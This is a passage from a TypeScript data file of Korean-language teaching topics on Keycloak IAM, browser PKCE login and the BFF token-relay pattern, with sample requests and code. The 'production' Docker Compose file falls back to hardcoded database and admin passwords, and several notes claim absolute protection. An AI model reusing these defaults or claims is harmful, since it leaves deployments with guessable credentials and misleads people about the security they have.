import { Topic } from '../types';

export const initialTopics: Topic[] = [
  {
    id: 'keycloak-iam-overview',
    slug: 'keycloak-iam-overview',
    title: 'Keycloak & Open Source IAM Overview',
    koreanTitle: 'Keycloak & 오픈소스 IAM 아키텍처 개요',
    category: 'IAM & Auth',
    summary: '엔터프라이즈 환경에서 통합 인증·인가(SSO, OIDC, RBAC)를 비즈니스 로직과 물리적으로 분리하는 이유와 글로벌 오픈소스 IAM 생태계를 조망합니다.',
    overview: `현대적인 웹/모바일 아키텍처에서 인증(Authentication)과 인가(Authorization)를 각 비즈니스 백엔드나 프론트엔드에 직접 구현하는 것은 심각한 안티패턴입니다.
비밀번호 해싱, 다중 인증(MFA), 소셜 로그인, 토큰 발행, 세션 관리, 보안 감사 로그 등의 복잡한 인증 로직을 중앙 집중화된 독립 IAM(Identity and Access Management) 솔루션에 위임함으로써 '관심사의 분리(Separation of Concerns)'와 '제로 트러스트(Zero Trust)' 보안을 달성할 수 있습니다.
Keycloak은 Red Hat 주도의 CNCF 생태계 표준 오픈소스 IAM으로서 OIDC/OAuth2/SAML 2.0 지원, 세밀한 역할 기반 접근 제어(RBAC), LDAP/Active Directory 연동, 내장 Infinispan 분산 세션 클러스터링을 기본 제공하여 글로벌 엔터프라이즈의 표준으로 자리잡았습니다.`,
    badges: ['Enterprise IAM', 'OIDC & OAuth 2.0', 'RBAC & ABAC', 'SSO', 'Keycloak 25+'],
    readingTimeMinutes: 7,
    diagramNodes: [
      { id: 'user', label: 'End User / Browser', subLabel: 'Client Agent', type: 'client', icon: 'User' },
      { id: 'app', label: 'Frontend (SPA/Web)', subLabel: 'React / Next.js', type: 'client', icon: 'Layout' },
      { id: 'iam', label: 'Keycloak IAM Cluster', subLabel: 'OIDC / Infinispan', type: 'auth', icon: 'ShieldCheck' },
      { id: 'gateway', label: 'API Gateway / BFF', subLabel: 'Envoy / Spring Cloud', type: 'gateway', icon: 'Network' },
      { id: 'services', label: 'Core Microservices', subLabel: 'Stateless APIs', type: 'server', icon: 'Server' },
      { id: 'user_db', label: 'IAM Database / LDAP', subLabel: 'PostgreSQL / AD', type: 'database', icon: 'Database' }
    ],
    flowSteps: [
      {
        step: 1,
        title: '인증 요청 및 SSO 리다이렉트',
        actor: 'User/Browser',
        target: 'Keycloak (IAM)',
        protocol: 'HTTPS GET (Front-Channel)',
        action: '사용자가 로그인을 시도하면 앱은 브라우저를 Keycloak 인증 엔드포인트(/auth)로 리다이렉트합니다.',
        description: '클라이언트 애플리케이션은 사용자의 비밀번호를 절대 직접 수집하지 않습니다. 브라우저가 직접 Keycloak의 보안 로그인 페이지로 이동하여 안전한 환경에서 인증이 수행됩니다.',
        payloadExample: `GET /realms/archdeck/protocol/openid-connect/auth?
  client_id=archdeck-web
  &response_type=code
  &scope=openid profile email
  &redirect_uri=https://app.archdeck.io/callback
  &code_challenge=E9Mel-2VzpWAH...
  &code_challenge_method=S256`,
        securityNote: '비밀번호를 비즈니스 앱이 보지 않으므로 크레덴셜 유출 위험이 원천 차단됩니다.',
        activeNodes: ['user', 'app', 'iam']
      },
      {
        step: 2,
        title: '사용자 자격 증명 검증 및 MFA',
        actor: 'Keycloak (IAM)',
        target: 'IAM Database / LDAP',
        protocol: 'Internal DB Query / LDAP Bind',
        action: 'Keycloak이 패스워드 해시(Argon2/PBKDF2) 및 TOTP MFA를 검증하고 중앙 SSO 세션을 생성합니다.',
        description: '성공 시 Infinispan 분산 인메모리 캐시에 SSO 세션을 등록하고, 일회용 Authorization Code(인가 코드)를 발행합니다.',
        payloadExample: `{ "userId": "usr_99824", "realm": "archdeck", "mfa_verified": true, "session_state": "b304c1..." }`,
        securityNote: 'Brute-force 공격 방어, 비밀번호 정책 강제, 계정 잠금 기능이 중앙에서 자동 집행됩니다.',
        activeNodes: ['iam', 'user_db']
      },
      {
        step: 3,
        title: '인가 코드 반환 및 토큰 발급',
        actor: 'Keycloak (IAM)',
        target: 'Frontend (SPA/Web)',
        protocol: 'HTTPS 302 Redirect → POST /token',
        action: '사용자 브라우저를 앱의 Callback URL로 리다이렉트하고, 인가 코드를 토큰으로 교환합니다.',
        description: '인증 서버는 서명된 JWT(Access Token, ID Token) 및 Refresh Token을 발행하여 클라이언트에 안전하게 전달합니다.',
        payloadExample: `POST /realms/archdeck/protocol/openid-connect/token
grant_type=authorization_code
&code=SplxlOBeZQQYbYS6WxSbIA
&client_id=archdeck-web
&code_verifier=dBjftJeZ4CVP-mB92K...`,
        securityNote: 'PKCE 검증이 완료되어야만 유효한 토큰이 생성됩니다.',
        activeNodes: ['iam', 'app']
      },
      {
        step: 4,
        title: 'JWKS 기반 무상태(Stateless) API 인가',
        actor: 'Frontend (SPA/Web)',
        target: 'Core Microservices',
        protocol: 'HTTPS REST (Bearer JWT)',
        action: '클라이언트가 Authorization: Bearer <JWT> 헤더를 첨부하여 마이크로서비스를 호출합니다.',
        description: '마이크로서비스들은 Keycloak을 매번 호출하지 않고, 사전에 캐시된 Keycloak의 JWKS 공개키로 JWT의 유효성과 Role을 로컬에서 즉시 검증합니다.',
        payloadExample: `Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfOTk...`,
        securityNote: '인가 검증 단계에서 중앙 IAM에 대한 네트워크 트래픽이 발생하지 않아 고속 처리가 가능합니다.',
        activeNodes: ['app', 'gateway', 'services']
      }
    ],
    keyTakeaways: [
      '관심사의 분리: 비즈니스 도메인 서비스는 비즈니스 로직에만 집중하고, 인증/계정 관리는 전담 IAM에 완전 위임',
      '표준 프로토콜 수용: OIDC(인증) 및 OAuth 2.0(인가) 표준 채택으로 멀티 플랫폼(Web, Mobile, B2B API) 확장 용이',
      '단일 장애점(SPOF) 극복: 백엔드는 JWKS 기반 무상태 JWT 검증을 수행하고, Keycloak은 Infinispan 클러스터로 HA 구성',
      '글로벌 대안 비교: 전통의 Keycloak(Java/엔터프라이즈), 경량의 authentik(Python/모던 UI), 클라우드 네이티브 ZITADEL(Go), 모듈형 Ory(Go/Kratos)'
    ],
    tradeOffs: {
      pros: [
        'SSO(Single Sign-On)로 전사 서비스 간 매끄러운 단일 로그인 경험 제공',
        '엔터프라이즈급 보안 표준(MFA, Passkey, WebAuthn, OAuth 2.1) 즉시 도입 가능',
        '감사 로그 및 컴플라이언스(GDPR, ISO 27001, ISMS-P) 요구사항 충족',
        '백엔드 마이크로서비스 간 일관된 JWT Claims 기반 인가 모델 수립'
      ],
      cons: [
        '별도의 고가용성 인프라(JVM 튜닝, Infinispan 클러스터, DB 이중화) 운영 복잡도 수반',
        '초기 러닝 커브: Realm, Client, Scope, Mapper, Flow 등 Keycloak 개념 습득 필요',
        '커스텀 테마 및 SPI(Service Provider Interface) 개발 시 Java 생태계 지식 요구'
      ]
    },
    codeSnippets: [
      {
        id: 'keycloak-docker',
        title: 'Keycloak 25+ 프로덕션 최적화 Docker Compose',
        filename: 'docker-compose.iam.yml',
        language: 'yaml',
        description: 'PostgreSQL을 스토리지로 사용하고 헬스체크와 최적화 옵션이 적용된 독립 Keycloak 구성입니다.',
        code: `version: '3.8'

services:
  keycloak-db:
    image: postgres:16-alpine
    container_name: archdeck-keycloak-db
    environment:
      POSTGRES_DB: keycloak
      POSTGRES_USER: keycloak
      POSTGRES_PASSWORD: \${KEYCLOAK_DB_PASSWORD:-StrongSecretDbPass123!}
    volumes:
      - kc_postgres_data:/var/lib/postgresql/data
    networks:
      - iam-network
    restart: unless-stopped

  keycloak:
    image: quay.io/keycloak/keycloak:25.0
    container_name: archdeck-iam
    command: start --optimized
    environment:
      KC_DB: postgres
      KC_DB_URL_HOST: keycloak-db
      KC_DB_URL_DATABASE: keycloak
      KC_DB_USERNAME: keycloak
      KC_DB_PASSWORD: \${KEYCLOAK_DB_PASSWORD:-StrongSecretDbPass123!}
      KC_HOSTNAME: auth.archdeck.io
      KC_PROXY_HEADERS: xforwarded
      KC_HTTP_ENABLED: 'true'
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: \${KEYCLOAK_BOOTSTRAP_ADMIN_PASS:-AdminSuperSecret99!}
      KC_FEATURES: token-exchange,preview
    depends_on:
      - keycloak-db
    ports:
      - "8080:8080"
    networks:
      - iam-network
    restart: unless-stopped

volumes:
  kc_postgres_data:

networks:
  iam-network:
    driver: bridge`
      },
      {
        id: 'jwks-backend-verification',
        title: 'Node.js Express JWKS 무상태 토큰 검증 미들웨어',
        filename: 'authMiddleware.ts',
        language: 'typescript',
        description: '인증 서버와 통신 없이 로컬 캐시된 JWKS 공개키로 서명을 검증하는 고속 무상태 미들웨어입니다.',
        code: `import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import jwksClient from 'jwks-rsa';

const client = jwksClient({
  jwksUri: 'https://auth.archdeck.io/realms/archdeck/protocol/openid-connect/certs',
  cache: true,
  cacheMaxEntries: 5,
  cacheMaxAge: 10 * 60 * 1000, // 10분 캐싱
  rateLimit: true,
  jwksRequestsPerMinute: 10 // DoS 방어
});

function getKey(header: jwt.JwtHeader, callback: jwt.SigningKeyCallback) {
  if (!header.kid) {
    return callback(new Error('JWT Header에 kid가 존재하지 않습니다.'));
  }
  client.getSigningKey(header.kid, (err, key) => {
    if (err) return callback(err);
    const signingKey = key?.getPublicKey();
    callback(null, signingKey);
  });
}

export function verifyJwtMiddleware(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: '인증 토큰이 누락되었습니다.' });
  }

  const token = authHeader.split(' ')[1];
  jwt.verify(token, getKey, {
    algorithms: ['RS256'],
    issuer: 'https://auth.archdeck.io/realms/archdeck',
  }, (err, decoded) => {
    if (err) {
      return res.status(403).json({ error: '유효하지 않거나 만료된 토큰입니다.', detail: err.message });
    }
    (req as any).user = decoded;
    next();
  });
}`
      }
    ],
    securityChecklistIds: ['chk-iam-1', 'chk-iam-2', 'chk-iam-3'],
    relatedTermIds: ['jwks', 'stateless-infinispan', 'back-channel', 'client-types'],
    relatedTopicIds: ['spa-pkce-direct', 'bff-token-relay', 'spa-vs-bff-comparison']
  },
  {
    id: 'spa-pkce-direct',
    slug: 'spa-pkce-direct',
    title: 'Frontend Direct OIDC Integration (SPA + PKCE)',
    koreanTitle: '프론트엔드 직접 OIDC 연동 (SPA + PKCE 아키텍처)',
    category: 'Frontend Architecture',
    summary: 'Public Client 환경의 브라우저에서 RFC 7636 PKCE를 적용하여 인가 코드를 안전하게 교환하고 메모리 격리로 토큰을 수명주기 관리하는 실무 패턴.',
    overview: `React, Vue 등 순수 브라우저 SPA(Single Page Application)는 백엔드 시크릿을 안전하게 저장할 수 없는 'Public Client'입니다.
과거에 사용되던 Implicit Grant(암시적 승인 방식)는 브라우저 URL Fragment에 토큰이 직접 노출되는 치명적인 취약점으로 인해 OAuth 2.0 BCP(Best Current Practice)에서 전면 폐기되었습니다.
현대 프론트엔드의 표준은 'Authorization Code Grant with PKCE(S256)'입니다.
브라우저는 암호학적 랜덤 난수인 \`code_verifier\`를 생성하고 이를 SHA-256 해시한 \`code_challenge\`를 인증 서버에 보냅니다.
무엇보다 가장 중요한 실무 원칙은 발급받은 Access Token과 Refresh Token을 절대로 \`localStorage\`나 \`sessionStorage\`에 저장하지 않고 '자바스크립트 인메모리(Closure/State)'에만 보관하는 것입니다. 새로고침 시에는 Silent Refresh(Iframe 또는 RTR 기반 갱신) 메커니즘을 결합합니다.`,
    badges: ['RFC 7636', 'S256 Hash', 'In-Memory Tokens', 'Public Client', 'Zero Storage'],
    readingTimeMinutes: 9,
    diagramNodes: [
      { id: 'spa', label: 'SPA App (React)', subLabel: 'In-Memory Storage', type: 'client', icon: 'Code' },
      { id: 'browser', label: 'Web Browser Context', subLabel: 'User-Agent / DOM', type: 'client', icon: 'Globe' },
      { id: 'iam', label: 'Keycloak OIDC', subLabel: 'Authorization Server', type: 'auth', icon: 'ShieldCheck' },
      { id: 'api', label: 'Resource Server', subLabel: 'Backend APIs', type: 'server', icon: 'Server' }
    ],
    flowSteps: [
      {
        step: 1,
        title: 'PKCE Key Pair(Verifier & Challenge) 생성',
        actor: 'SPA App (React)',
        target: 'Web Browser Context',
        protocol: 'Web Crypto API (crypto.subtle)',
        action: '브라우저 암호화 API로 고엔트로피 난수 code_verifier를 만들고, SHA-256 해시 후 Base64URL 인코딩하여 code_challenge를 계산합니다.',
        description: 'code_verifier는 세션 스토리지나 메모리에 임시 보관되며, code_challenge만이 인가 요청 URL에 포함됩니다.',
        payloadExample: `// code_verifier 생성 예시:
const verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
// S256 해시 연산:
const challenge = "E9Mel-2VzpWAHgzBQN56_0QnOWGAGy-WCpti1rKwDA0";`,
        securityNote: 'Plain 방식은 공격자가 가로챌 수 있으므로 반드시 S256 알고리즘을 강제해야 합니다.',
        activeNodes: ['spa', 'browser']
      },
      {
        step: 2,
        title: 'Authorization Code 요청 (Redirect)',
        actor: 'Web Browser Context',
        target: 'Keycloak OIDC',
        protocol: 'HTTPS GET /protocol/openid-connect/auth',
        action: 'code_challenge 및 code_challenge_method=S256 파라미터와 함께 인증 서버로 이동합니다.',
        description: '사용자가 Keycloak 로그인 화면에서 인증을 마치면, Keycloak은 code_challenge를 세션에 기록하고 일회용 인가 코드(Code)를 앱의 redirect_uri로 전달합니다.',
        payloadExample: `GET /auth?response_type=code
  &client_id=spa-client
  &redirect_uri=https://frontend.io/callback
  &code_challenge=E9Mel-2VzpWAHgzBQN56...
  &code_challenge_method=S256
  &state=xyzStateParamSafe`,
        securityNote: 'CSRF 방지를 위해 state 파라미터는 암호학적 랜덤값이어야 하며 콜백 시 반드시 일치 검증을 수행합니다.',
        activeNodes: ['browser', 'iam']
      },
      {
        step: 3,
        title: '인가 코드 및 Verifier를 통한 토큰 교환',
        actor: 'SPA App (React)',
        target: 'Keycloak OIDC',
        protocol: 'HTTPS POST /protocol/openid-connect/token',
        action: '콜백 수신 후, 원본 code_verifier와 인가 코드를 POST 본문에 담아 토큰 발급을 요청합니다.',
        description: 'Keycloak은 수신한 code_verifier를 SHA-256 해시하여 2단계에서 저장해 둔 code_challenge와 정확히 일치하는지 수학적으로 검증합니다. 일치 시 Access Token과 Refresh Token을 응답합니다.',
        payloadExample: `POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&client_id=spa-client
&code=SplxlOBeZQQYbYS6WxSbIA
&redirect_uri=https://frontend.io/callback
&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`,
        securityNote: '인가 코드가 제3자에게 노출되더라도, 브라우저가 생성한 원본 verifier를 모르면 토큰을 얻을 수 없습니다.',
        activeNodes: ['spa', 'iam']
      },
      {
        step: 4,
        title: '인메모리 저장 및 Bearer API 호출',
        actor: 'SPA App (React)',
        target: 'Resource Server',
        protocol: 'HTTPS REST (Authorization: Bearer)',
        action: '토큰을 React State/모듈 클로저 변수에만 보관하고, API 요청 시 헤더에 Bearer 토큰으로 전송합니다.',
        description: 'localStorage에 절대 토큰을 저장하지 않음으로써 XSS 공격이 발생하더라도 로컬 스토리지 일괄 덤프를 통한 토큰 도난을 방지합니다.',
        payloadExample: `fetch('https://api.archdeck.io/v1/projects', {
  headers: {
    'Authorization': \`Bearer \${memoryStore.getAccessToken()}\`,
    'Content-Type': 'application/json'
  }
})`,
        securityNote: '새로고침 시 메모리가 초기화되므로 Silent Refresh(Hidden iframe or Refresh Token Rotation) 패턴이 수반되어야 합니다.',
        activeNodes: ['spa', 'api']
      }
    ],
    keyTakeaways: [
      'PKCE(S256) 필수화: Public Client의 취약점인 인가 코드 가로채기(Code Interception) 완벽 차단',
      'No localStorage 원칙: XSS 공격 시 가장 취약한 지점인 웹 스토리지를 비우고 인메모리 격리 저장소 구축',
      'Refresh Token Rotation(RTR): Refresh Token 사용 시마다 매번 갱신하고 재사용 시 전체 세션 폐기',
      'ITP(지능형 추적 방지) 고려: Safari 등 모던 브라우저의 서드파티 쿠키 차단으로 인한 Iframe Silent Token 갱신 제한 대책 수립'
    ],
    tradeOffs: {
      pros: [
        '별도의 BFF 백엔드 프록시 서버 없이 프론트엔드와 인증 서버 간 직접 연동으로 가벼운 인프라 유지',
        '프론트엔드 개발자가 OIDC 클라이언트 라이브러리(oidc-client-ts 등)로 신속한 개발 가능',
        '정적 호스팅(S3, Cloudflare Pages, Vercel)만으로 글로벌 CDN 배포 용이'
      ],
      cons: [
        '토큰이 브라우저 런타임 메모리에 존재하므로 메모리 덤프나 고도화된 DOM XSS 공격에 여전히 취약',
        'F5(새로고침) 시 토큰 유실 문제: 토큰 재발급 과정에서 깜빡임(Flickering) 또는 네트워크 오버헤드 발생',
        'Safari ITP/Brave 브라우저의 쿠키 정책 강화로 백그라운드 세션 유지가 점점 까다로워짐'
      ]
    },
    codeSnippets: [
      {
        id: 'pkce-generator-ts',
        title: 'Web Crypto API 기반 순수 TypeScript PKCE 구현체',
        filename: 'pkceUtils.ts',
        language: 'typescript',
        description: '서드파티 라이브러리 없이 브라우저 내장 SubtleCrypto를 활용한 고보안 S256 생성 유틸리티입니다.',
        code: `// RFC 7636 준수 S256 PKCE Generator
export async function generatePKCE() {
  // 1. 43~128자 길이의 암호학적 랜덤 바이트 생성
  const array = new Uint8Array(64);
  window.crypto.getRandomValues(array);
  const code_verifier = base64UrlEncode(array);

  // 2. code_verifier의 SHA-256 해시 계산
  const encoder = new TextEncoder();
  const data = encoder.encode(code_verifier);
  const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);

  // 3. Base64URL 인코딩으로 code_challenge 도출
  const code_challenge = base64UrlEncode(new Uint8Array(hashBuffer));

  return {
    code_verifier,
    code_challenge,
    code_challenge_method: 'S256' as const
  };
}

function base64UrlEncode(buffer: Uint8Array): string {
  let binary = '';
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary)
    .replace(/\\+/g, '-')
    .replace(/\\//g, '_')
    .replace(/=+$/, '');
}`
      },
      {
        id: 'in-memory-token-store',
        title: '클로저(Closure) 기반 인메모리 토큰 안전 보관소',
        filename: 'tokenStore.ts',
        language: 'typescript',
        description: 'window 객체나 DOM에 노출되지 않는 프라이빗 스코프의 토큰 스토어 패턴입니다.',
        code: `// 외부 스크립트가 접근할 수 없는 클로저 영역
const createSecureTokenStore = () => {
  let inMemoryAccessToken: string | null = null;
  let tokenExpiresAt: number = 0;

  return {
    setToken: (token: string, expiresInSeconds: number) => {
      inMemoryAccessToken = token;
      // 만료 60초 전 갱신 여유분 버퍼
      tokenExpiresAt = Date.now() + (expiresInSeconds - 60) * 1000;
    },
    getAccessToken: () => inMemoryAccessToken,
    isExpired: () => Date.now() >= tokenExpiresAt,
    clear: () => {
      inMemoryAccessToken = null;
      tokenExpiresAt = 0;
    }
  };
};

export const secureTokenStore = createSecureTokenStore();`
      }
    ],
    securityChecklistIds: ['chk-pkce-1', 'chk-pkce-2', 'chk-xss-1'],
    relatedTermIds: ['pkce', 'client-types', 'token-rotation', 'xss'],
    relatedTopicIds: ['keycloak-iam-overview', 'bff-token-relay', 'spa-vs-bff-comparison']
  },
  {
    id: 'bff-token-relay',
    slug: 'bff-token-relay',
    title: 'BFF Pattern (Backend for Frontend) & Token Relay',
    koreanTitle: 'BFF 패턴 & Token Relay 아키텍처',
    category: 'Backend & BFF',
    summary: '브라우저에는 HttpOnly 암호화 세션 쿠키만 허용하고, 백채널에서 JWT를 관리하여 마이크로서비스로 주입(Relay)하는 엔터프라이즈 최상위 보안 패턴.',
    overview: `BFF(Backend for Frontend) 패턴은 프론트엔드와 백엔드 마이크로서비스 사이에 전담 백엔드 계층을 두어 보안과 API 조합을 책임지게 하는 아키텍처입니다.
인증 관점에서 BFF의 핵심 역할은 브라우저를 'Public Client'의 위험에서 격리하고, BFF 서버 자체가 'Confidential Client'로서 인증 서버(Keycloak)와 백채널(Back-Channel) 통신을 전담하는 것입니다.
브라우저는 오직 안전한 \`HttpOnly\`, \`Secure\`, \`SameSite=Lax/Strict\` 세션 쿠키만을 주고받으며, Access Token이나 Refresh Token과 같은 실제 OAuth2 크레덴셜은 서버 측 고성능 세션 스토어(Redis)에만 격리 보관됩니다.
BFF는 프론트엔드의 요청을 받아 세션을 복원한 후, 내부 다운스트림 마이크로서비스로 요청을 프록시할 때 \`Authorization: Bearer <JWT>\` 헤더를 자동으로 주입(Token Relay)합니다.
이를 통해 치명적인 XSS 공격이 발생해도 브라우저에는 탈취할 수 있는 JWT 토큰 자체가 전혀 존재하지 않으며, 관리자는 Redis 세션 키를 삭제하여 즉시 전사 세션을 무효화하는 'Kill Switch'를 확보할 수 있습니다.`,
    badges: ['Confidential Client', 'HttpOnly Cookie', 'Token Relay', 'Redis HA', 'Kill Switch', 'OAuth 2.1 Standard'],
    readingTimeMinutes: 11,
    diagramNodes: [
      { id: 'browser', label: 'Client (SPA)', subLabel: 'No Tokens Held', type: 'client', icon: 'Layout' },
      { id: 'bff', label: 'BFF Server (Node/Go/Java)', subLabel: 'Confidential Client', type: 'gateway', icon: 'Cpu' },
      { id: 'redis', label: 'Session Store (Redis HA)', subLabel: 'Cluster / Sentinel', type: 'database', icon: 'Database' },
      { id: 'iam', label: 'Keycloak (IAM)', subLabel: 'Back-Channel Auth', type: 'auth', icon: 'ShieldCheck' },
      { id: 'services', label: 'Internal Microservices', subLabel: 'Stateless Bearer JWT', type: 'server', icon: 'Server' }
    ],
    flowSteps: [
      {
        step: 1,
        title: 'BFF 백채널 인증 및 인가 코드 교환',
        actor: 'BFF Server (Node/Go/Java)',
        target: 'Keycloak (IAM)',
        protocol: 'HTTPS POST /token (Back-Channel)',
        action: '사용자 로그인이 완료되면 BFF는 안전하게 은닉된 Client Secret과 PKCE code_verifier를 함께 사용하여 인가 코드를 토큰으로 교환합니다.',
        description: '브라우저는 Client Secret을 절대 볼 수 없습니다. 백채널 상호 인증이 완료되면 Keycloak은 BFF에게 Access Token과 Refresh Token을 안전하게 반환합니다.',
        payloadExample: `POST /realms/archdeck/protocol/openid-connect/token
grant_type=authorization_code
&client_id=archdeck-bff-confidential
&client_secret=s3cr3t_v@lu3_99824...
&code=SplxlOBeZQQYbYS6WxSbIA
&code_verifier=highEntropyVerifier43Chars...`,
        securityNote: 'Confidential Client 인증이 적용되므로 사칭이나 토큰 가로채기가 불가능합니다.',
        activeNodes: ['bff', 'iam']
      },
      {
        step: 2,
        title: 'Redis 세션 저장 및 암호화 쿠키 발행',
        actor: 'BFF Server (Node/Go/Java)',
        target: 'Redis Session Store',
        protocol: 'Internal TCP (RESP) → Set-Cookie',
        action: 'BFF는 수신한 JWT Access/Refresh Token을 Redis에 세션 ID 키로 암호화 저장하고, 브라우저에는 HttpOnly 세션 쿠키만을 구워 반환합니다.',
        description: '세션 쿠키에는 HttpOnly, Secure, SameSite=Lax 속성이 강제되어 자바스크립트(document.cookie)로의 접근이 100% 차단됩니다.',
        payloadExample: `// Redis 저장 키:
SET session:sess_a891f74... '{"access_token":"eyJ...","refresh_token":"eyJ..."}' EX 7200

// 브라우저 응답 헤더:
Set-Cookie: __Host-ArchSession=sess_a891f74...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=7200`,
        securityNote: '__Host- 쿠키 프리픽스를 적용하여 서브도메인 쿠키 덮어쓰기 공격을 방어합니다.',
        activeNodes: ['bff', 'redis', 'browser']
      },
      {
        step: 3,
        title: '세션 기반 API 호출 및 CSRF 검증',
        actor: 'Client (SPA)',
        target: 'BFF Server (Node/Go/Java)',
        protocol: 'HTTPS (Session Cookie + X-XSRF-TOKEN)',
        action: '프론트엔드는 비즈니스 API 호출 시 세션 쿠키와 함께 CSRF 방어용 커스텀 헤더를 동봉하여 BFF로 전송합니다.',
        description: 'BFF는 CSRF 토큰의 유효성을 검증하고, 유입된 세션 쿠키를 이용해 Redis에서 활성 세션과 원본 Access Token을 조회합니다.',
        payloadExample: `GET /api/v1/orders HTTP/1.1
Host: bff.archdeck.io
Cookie: __Host-ArchSession=sess_a891f74...
X-XSRF-TOKEN: e3b0c44298fc1c149afbf4c8996fb924...`,
        securityNote: 'HttpOnly 쿠키의 유일한 약점인 CSRF는 커스텀 헤더 및 SameSite 속성으로 철통 방어합니다.',
        activeNodes: ['browser', 'bff', 'redis']
      },
      {
        step: 4,
        title: '자동 토큰 릴레이(Token Relay) & 백엔드 프록시',
        actor: 'BFF Server (Node/Go/Java)',
        target: 'Internal Microservices',
        protocol: 'Internal HTTPS (Authorization: Bearer <JWT>)',
        action: 'BFF가 내부 마이크로서비스로 요청을 프록시할 때, Authorization 헤더에 원본 JWT를 자동 주입하여 릴레이합니다.',
        description: '만약 Access Token이 만료 임박했다면 BFF가 Redis의 Refresh Token을 이용해 Keycloak과 백채널로 자동 갱신한 후 요청을 전달합니다. 백엔드 서비스들은 표준 Bearer JWT 무상태 검증을 그대로 수행합니다.',
        payloadExample: `GET /orders HTTP/1.1
Host: orders-service.internal.archdeck.local
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c3Jf...
X-Request-ID: req_882910`,
        securityNote: '내부 마이크로서비스는 세션 개념을 알 필요 없이 순수 JWT 검증만 수행하므로 MSA 아키텍처가 깔끔하게 유지됩니다.',
        activeNodes: ['bff', 'services']
      },
      {
        step: 5,
        title: '킬 스위치 (Kill Switch) 즉시 세션 차단',
        actor: 'BFF Server (Node/Go/Java)',
        target: 'Redis Session Store',
        protocol: 'Redis DEL key / OIDC Back-Channel Logout',
        action: '이상 징후 감지나 관리자 로그아웃 발생 시, Redis에서 해당 사용자의 세션을 1초 이내에 즉각 파기합니다.',
        description: '이후 들어오는 모든 쿠키 요청은 즉각 401 Unauthorized로 거부되며, 내부 마이크로서비스로의 토큰 릴레이가 즉시 완전 차단됩니다.',
        payloadExample: `// Redis 즉시 만료:
DEL session:sess_a891f74...
// Keycloak 백채널 로그아웃 웹훅 수신 시 사용자 전체 세션 무효화`,
        securityNote: '순수 무상태 JWT의 가장 큰 취약점인 즉각적인 토큰 무효화 불가능 문제를 세션 스토어로 완벽히 해결합니다.',
        activeNodes: ['bff', 'redis', 'iam']
      }
    ],
    keyTakeaways: [
      '엔터프라이즈 최상위 보안: 브라우저에 토큰을 절대 주지 않는 Zero-Token-in-Browser 원칙 구현',
      'XSS 방어 극대화: 자바스크립트가 토큰을 읽을 수 없으므로 XSS가 발생해도 토큰 직접 유출 불가',
      'Token Relay 패턴: 내부 마이크로서비스는 표준 JWT 기반 무상태성을 그대로 향유',
      '실시간 제어권(Kill Switch): Redis 세션 제어로 순수 JWT의 최대 단점인 취소 불가능성 극복',
      '인프라 고려사항: Redis 고가용성(Sentinel/Cluster), 세션 스토리지 사이징, CSRF 토큰 계층 필수'
    ],
    tradeOffs: {
      pros: [
        '최고 수준의 클라이언트 보안: XSS로부터 토큰을 완벽 격리',
        '토큰 자동 갱신(Silent Refresh)을 서버 측에서 안정적으로 백채널 처리하여 ITP 이슈 원천 차단',
        '원클릭 세션 만료 및 디바이스별 로그아웃 제어 가능',
        'API 애그리게이션(여러 마이크로서비스 응답 조합 및 가공)으로 프론트엔드 네트워크 최적화'
      ],
      cons: [
        '별도의 BFF 백엔드 서버(Node.js/Spring 등) 개발 및 인프라 운영 비용 발생',
        'Redis 세션 스토어의 고가용성(HA) 및 메모리 모니터링 부담',
        '쿠키 기반 통신으로 인한 CSRF 공격 방어책(SameSite, CSRF Token) 추가 구현 필수'
      ]
    },
    codeSnippets: [
      {
        id: 'bff-token-relay-middleware',
        title: 'Express / Fastify 기반 Token Relay 프록시 미들웨어',
        filename: 'tokenRelayProxy.ts',
        language: 'typescript',
        description: '세션 쿠키를 추출해 Redis에서 토큰을 복원하고 마이크로서비스로 헤더를 주입하는 BFF 코어 로직입니다.',
        code: `import { Request, Response, NextFunction } from 'express';
import { createProxyMiddleware } from 'http-proxy-middleware';
import { redisClient } from './redisClient';
import { refreshAccessTokenIfNeeded } from './authService';

export async function tokenRelayMiddleware(req: Request, res: Response, next: NextFunction) {
  // 1. HttpOnly 세션 쿠키 추출
  const sessionId = req.cookies['__Host-ArchSession'];
  if (!sessionId) {
    return res.status(401).json({ error: '인증되지 않은 세션입니다.' });
  }

  // 2. Redis에서 세션 및 토큰 복원
  const sessionDataStr = await redisClient.get(\`session:\${sessionId}\`);
  if (!sessionDataStr) {
    return res.status(401).json({ error: '세션이 만료되었거나 취소되었습니다.' });
  }

  let session = JSON.parse(sessionDataStr);

  // 3. 만료 체크 및 필요 시 자동 백채널 갱신
  if (Date.now() >= session.expiresAt - 30000) {
    session = await refreshAccessTokenIfNeeded(sessionId, session.refreshToken);
  }

  // 4. 프록시 요청 헤더에 JWT 주입 (Token Relay)
  req.headers['authorization'] = \`Bearer \${session.accessToken}\`;
  req.headers['x-forwarded-user-id'] = session.userId;
  
  next();
}

// 5. 다운스트림 마이크로서비스 프록시 설정
export const ordersServiceProxy = createProxyMiddleware({
  target: process.env.ORDERS_SERVICE_URL || 'http://orders-svc.internal:8080',
  changeOrigin: true,
  on: {
    proxyReq: (proxyReq, req) => {
      // 주입된 Authorization 헤더가 안전하게 전달됨
      if (req.headers['authorization']) {
        proxyReq.setHeader('authorization', req.headers['authorization']);
      }
    }
  }
});`
      },
      {
        id: 'bff-kill-switch',
        title: 'Redis O(1) 세션 무효화 킬 스위치 (Kill Switch)',
        filename: 'sessionKillSwitch.ts',
        language: 'typescript',
